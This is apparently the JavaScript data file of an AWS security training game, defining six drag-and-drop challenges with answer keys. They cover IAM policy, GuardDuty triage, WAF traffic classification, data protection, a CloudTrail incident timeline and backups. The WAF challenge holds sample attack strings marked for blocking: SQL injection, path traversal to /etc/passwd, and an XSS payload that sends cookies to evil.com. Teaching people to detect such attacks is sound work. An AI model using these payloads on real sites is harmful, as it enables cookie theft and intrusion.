/**
 * All 6 challenge definitions.
 *
 * Common shape:
 *   id          – unique slug
 *   domain      – display label
 *   title       – challenge title
 *   icon        – emoji icon
 *   description – brief task description shown on Mission Board
 *   scenario    – full narrative shown on the Challenge screen
 *   type        – 'bucket' | 'order' | 'match'
 *   items       – draggable cards
 *   zones       – drop zones (for bucket / match types)
 *   correctAnswer – machine-readable answer for scoring
 *   explanation – shown on Results screen
 *   awsTool     – real AWS service that solves this
 *   clue        – hint text (costs 25 pts)
 */

export const challenges = [
  // ─────────────────────────────────────────────
  // 1. IAM — Fix the Policy
  // ─────────────────────────────────────────────
  {
    id: 'iam',
    domain: 'Identity & Access',
    title: 'Fix the Policy',
    icon: '🔐',
    description: 'Drag permission statements into Allow or Deny to build a least-privilege IAM policy.',
    scenario:
      'A developer accidentally attached an overly-permissive policy to a Lambda function. You need to rebuild the policy from scratch. Drag each permission statement into the correct bucket — Allow only what the function actually needs, and explicitly Deny the rest.',
    type: 'bucket',
    items: [
      { id: 'iam-1', label: 's3:GetObject on app-data bucket', correct: 'allow' },
      { id: 'iam-2', label: 's3:DeleteBucket on *', correct: 'deny' },
      { id: 'iam-3', label: 'logs:CreateLogGroup', correct: 'allow' },
      { id: 'iam-4', label: 'iam:CreateUser on *', correct: 'deny' },
      { id: 'iam-5', label: 'logs:PutLogEvents', correct: 'allow' },
      { id: 'iam-6', label: 'iam:AttachUserPolicy on *', correct: 'deny' },
      { id: 'iam-7', label: 'dynamodb:GetItem on orders table', correct: 'allow' },
      { id: 'iam-8', label: 'ec2:TerminateInstances on *', correct: 'deny' },
    ],
    zones: [
      { id: 'allow', label: 'Allow', color: 'success' },
      { id: 'deny', label: 'Deny', color: 'danger' },
    ],
    correctAnswer: {
      allow: ['iam-1', 'iam-3', 'iam-5', 'iam-7'],
      deny: ['iam-2', 'iam-4', 'iam-6', 'iam-8'],
    },
    explanation:
      'A least-privilege IAM policy grants only the specific actions the resource needs to function — in this case S3 read access, CloudWatch Logs write, and DynamoDB read. Wildcard actions like s3:DeleteBucket, iam:CreateUser, and ec2:TerminateInstances should always be explicitly denied to prevent privilege escalation.',
    awsTool: 'AWS IAM Access Analyzer',
    clue: 'A Lambda function only needs to read data and write logs. Any action that creates, deletes, or modifies infrastructure is suspicious.',
  },

  // ─────────────────────────────────────────────
  // 2. Endpoint Protection — Triage the Findings
  // ─────────────────────────────────────────────
  {
    id: 'endpoint',
    domain: 'Endpoint Protection',
    title: 'Triage the Findings',
    icon: '🛡️',
    description: 'GuardDuty findings are shown as cards. Drag them into severity order: Critical → High → Medium → Low.',
    scenario:
      'GuardDuty just fired 6 findings across your AWS account. Your job is to triage them — drag the finding cards into correct severity order from most critical to least critical. Response time matters.',
    type: 'order',
    items: [
      {
        id: 'ep-1',
        label: 'Trojan:EC2/DNSDataExfiltration',
        detail: 'EC2 instance querying known C2 domain via DNS',
        correct: 1,
      },
      {
        id: 'ep-2',
        label: 'UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B',
        detail: 'Root account login from anonymous proxy',
        correct: 2,
      },
      {
        id: 'ep-3',
        label: 'Recon:EC2/PortProbeUnprotectedPort',
        detail: 'Unusual port scan on EC2 instance',
        correct: 4,
      },
      {
        id: 'ep-4',
        label: 'CryptoCurrency:EC2/BitcoinTool.B',
        detail: 'EC2 querying Bitcoin mining pool',
        correct: 3,
      },
      {
        id: 'ep-5',
        label: 'Policy:IAMUser/RootCredentialUsage',
        detail: 'Root credentials used in the last 24 hours',
        correct: 5,
      },
      {
        id: 'ep-6',
        label: 'Behavior:EC2/NetworkPortUnusual',
        detail: 'EC2 communicating on unusual outbound port',
        correct: 6,
      },
    ],
    zones: [],
    correctAnswer: ['ep-1', 'ep-2', 'ep-4', 'ep-3', 'ep-5', 'ep-6'],
    explanation:
      'DNS data exfiltration to a C2 domain is the highest severity — active compromise. Root login from a proxy indicates likely account takeover. Crypto mining means a compromised instance. Port probing is reconnaissance (pre-attack). Root credential usage and unusual ports are medium-to-low findings requiring monitoring.',
    awsTool: 'Amazon GuardDuty',
    clue: 'Think about active vs. passive threat indicators. Active data exfiltration to a known bad domain outranks credential misuse, which outranks reconnaissance.',
  },

  // ─────────────────────────────────────────────
  // 3. Web App Security — Block the Attack
  // ─────────────────────────────────────────────
  {
    id: 'webapp',
    domain: 'Web App Security',
    title: 'Block the Attack',
    icon: '🌐',
    description: 'Classify each incoming web request — drag malicious traffic to WAF Block and legit traffic to Allow Through.',
    scenario:
      'Your WAF is in detection-only mode and you\'ve been asked to review the last 8 requests and set correct actions. Misclassifying legitimate traffic costs points — read the requests carefully before placing them.',
    type: 'bucket',
    items: [
      {
        id: 'wa-1',
        label: "GET /products?id=1 OR 1=1--",
        detail: 'SQL injection attempt via query param',
        correct: 'block',
      },
      {
        id: 'wa-2',
        label: "POST /login  body: username=admin&password=hunter2",
        detail: 'Standard login form submission',
        correct: 'allow',
      },
      {
        id: 'wa-3',
        label: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
        detail: 'Stored XSS payload in a comment field',
        correct: 'block',
      },
      {
        id: 'wa-4',
        label: 'GET /api/products — 5,000 req/s from 1 IP',
        detail: 'DDoS / rate-limit violation',
        correct: 'block',
      },
      {
        id: 'wa-5',
        label: "GET /search?q=blue+running+shoes",
        detail: 'Normal product search query',
        correct: 'allow',
      },
      {
        id: 'wa-6',
        label: "POST /upload  Content-Type: application/x-php",
        detail: 'Malicious file upload attempt',
        correct: 'block',
      },
      {
        id: 'wa-7',
        label: "GET /about-us  User-Agent: Mozilla/5.0 (compatible)",
        detail: 'Static page request from a browser',
        correct: 'allow',
      },
      {
        id: 'wa-8',
        label: "GET /admin/../../../etc/passwd",
        detail: 'Path traversal attempt',
        correct: 'block',
      },
    ],
    zones: [
      { id: 'block', label: 'WAF Block', color: 'danger' },
      { id: 'allow', label: 'Allow Through', color: 'success' },
    ],
    correctAnswer: {
      block: ['wa-1', 'wa-3', 'wa-4', 'wa-6', 'wa-8'],
      allow: ['wa-2', 'wa-5', 'wa-7'],
    },
    explanation:
      'AWS WAF rules should block SQL injection (OR 1=1), XSS payloads (script tags), rate-limit violations (5k req/s), PHP file uploads, and path traversal (../../). Standard form submissions, product searches, and browser GET requests are legitimate traffic and should not be blocked.',
    awsTool: 'AWS WAF + AWS Shield',
    clue: 'Look for SQL keywords, script tags, path separators (../), unusual Content-Types, and abnormal request rates. Normal web traffic has clean URLs and standard MIME types.',
  },

  // ─────────────────────────────────────────────
  // 4. Data Security — Classify the Data
  // ─────────────────────────────────────────────
  {
    id: 'data',
    domain: 'Data Security',
    title: 'Classify the Data',
    icon: '🗄️',
    description: 'Drag each data type into the correct protection bucket: Encrypt with KMS, Scan with Macie, or No Action Needed.',
    scenario:
      'Your team is auditing a new S3 bucket before it goes live. Eight data types have been discovered in the bucket. Assign the correct protection action to each one.',
    type: 'bucket',
    items: [
      { id: 'ds-1', label: 'Social Security Numbers (SSNs)', correct: 'macie' },
      { id: 'ds-2', label: 'AWS Access Key ID + Secret', correct: 'macie' },
      { id: 'ds-3', label: 'Company public press release', correct: 'none' },
      { id: 'ds-4', label: 'Customer credit card numbers (PAN)', correct: 'kms' },
      { id: 'ds-5', label: 'Internal employee salary data', correct: 'kms' },
      { id: 'ds-6', label: 'Open-source software license file', correct: 'none' },
      { id: 'ds-7', label: 'Database password in a config file', correct: 'macie' },
      { id: 'ds-8', label: 'Healthcare records (PHI)', correct: 'kms' },
    ],
    zones: [
      { id: 'kms', label: 'Encrypt with KMS', color: 'orange' },
      { id: 'macie', label: 'Scan with Macie', color: 'sky' },
      { id: 'none', label: 'No Action Needed', color: 'neutral' },
    ],
    correctAnswer: {
      kms: ['ds-4', 'ds-5', 'ds-8'],
      macie: ['ds-1', 'ds-2', 'ds-7'],
      none: ['ds-3', 'ds-6'],
    },
    explanation:
      'Amazon Macie scans for sensitive data patterns (credentials, PII like SSNs, exposed API keys) already in your S3 buckets. AWS KMS encryption protects structured sensitive data at rest (PCI card numbers, HIPAA PHI, HR records). Publicly available content like press releases and open-source licenses require no special protection.',
    awsTool: 'Amazon Macie + AWS KMS',
    clue: 'Macie detects — it scans for secrets and PII that should not be in S3 at all. KMS encrypts — it protects data that must be stored but needs to be locked down.',
  },

  // ─────────────────────────────────────────────
  // 5. Incident Response — Read the CloudTrail Log
  // ─────────────────────────────────────────────
  {
    id: 'incident',
    domain: 'Incident Response',
    title: 'Read the CloudTrail Log',
    icon: '📋',
    description: 'Reconstruct a security incident by dragging CloudTrail events into the correct chronological order.',
    scenario:
      'An S3 bucket containing customer data was exfiltrated. CloudTrail captured 6 events. Reconstruct the attack timeline by dragging the events into the correct order — earliest event at the top.',
    type: 'order',
    items: [
      {
        id: 'ir-1',
        label: 'ConsoleLogin',
        detail: 'Root user login from IP 185.220.101.45 (Tor exit node) at 02:14 UTC',
        correct: 1,
      },
      {
        id: 'ir-2',
        label: 'GetBucketPolicy',
        detail: 'Enumerated bucket policy on customer-data-prod at 02:17 UTC',
        correct: 2,
      },
      {
        id: 'ir-3',
        label: 'PutBucketAcl',
        detail: 'Bucket ACL changed to public-read at 02:19 UTC',
        correct: 3,
      },
      {
        id: 'ir-4',
        label: 'ListObjects',
        detail: '4,200 objects enumerated in customer-data-prod at 02:20 UTC',
        correct: 4,
      },
      {
        id: 'ir-5',
        label: 'GetObject (bulk)',
        detail: '4,200 files downloaded to external IP 185.220.101.45 between 02:21–02:34 UTC',
        correct: 5,
      },
      {
        id: 'ir-6',
        label: 'DeleteBucket',
        detail: 'customer-data-prod bucket deleted at 02:35 UTC',
        correct: 6,
      },
    ],
    zones: [],
    correctAnswer: ['ir-1', 'ir-2', 'ir-3', 'ir-4', 'ir-5', 'ir-6'],
    explanation:
      'Classic S3 data theft pattern: (1) attacker authenticates via stolen root creds, (2) enumerates permissions, (3) makes bucket public, (4) lists all objects, (5) bulk-downloads everything, then (6) deletes the bucket to cover tracks. CloudTrail timestamps are the key — read the UTC times on each event.',
    awsTool: 'AWS CloudTrail + Amazon Detective',
    clue: 'Read the timestamps on each event. The attack follows a logical sequence: authenticate → enumerate → escalate permissions → list data → exfiltrate → destroy evidence.',
  },

  // ─────────────────────────────────────────────
  // 6. Backups & Recovery — Design the Backup Plan
  // ─────────────────────────────────────────────
  {
    id: 'backup',
    domain: 'Backups & Recovery',
    title: 'Design the Backup Plan',
    icon: '💾',
    description: 'Match each backup strategy to the disaster scenario it best protects against.',
    scenario:
      'Your team needs to design a multi-layer backup strategy. Four disaster scenarios have been identified. Drag each backup strategy to the scenario it most directly defends against.',
    type: 'match',
    items: [
      { id: 'bk-1', label: 'S3 Versioning', correct: 'accidental-delete' },
      { id: 'bk-2', label: 'RDS Automated Snapshots', correct: 'db-corruption' },
      { id: 'bk-3', label: 'AWS Backup cross-region copy', correct: 'region-outage' },
      { id: 'bk-4', label: 'S3 Object Lock (WORM)', correct: 'ransomware' },
    ],
    zones: [
      { id: 'ransomware', label: 'Ransomware Attack', color: 'danger' },
      { id: 'accidental-delete', label: 'Accidental File Deletion', color: 'warn' },
      { id: 'region-outage', label: 'Full Region Outage', color: 'sky' },
      { id: 'db-corruption', label: 'Database Corruption', color: 'orange' },
    ],
    correctAnswer: {
      ransomware: ['bk-4'],
      'accidental-delete': ['bk-1'],
      'region-outage': ['bk-3'],
      'db-corruption': ['bk-2'],
    },
    explanation:
      'S3 Object Lock (WORM — Write Once Read Many) prevents ransomware from encrypting or deleting backups. S3 Versioning lets you restore previous file versions after accidental deletion. AWS Backup with cross-region copy ensures a full region failure does not destroy your data. RDS Automated Snapshots let you roll back a corrupted database to a known-good point-in-time.',
    awsTool: 'AWS Backup + S3 Object Lock',
    clue: 'Think about what each disaster actually destroys. Ransomware encrypts live data — you need immutable backups. Region outage takes down everything in one region — you need copies elsewhere.',
  },
];

export const CHALLENGE_MAP = Object.fromEntries(challenges.map((c) => [c.id, c]));
export const CHALLENGE_IDS = challenges.map((c) => c.id);
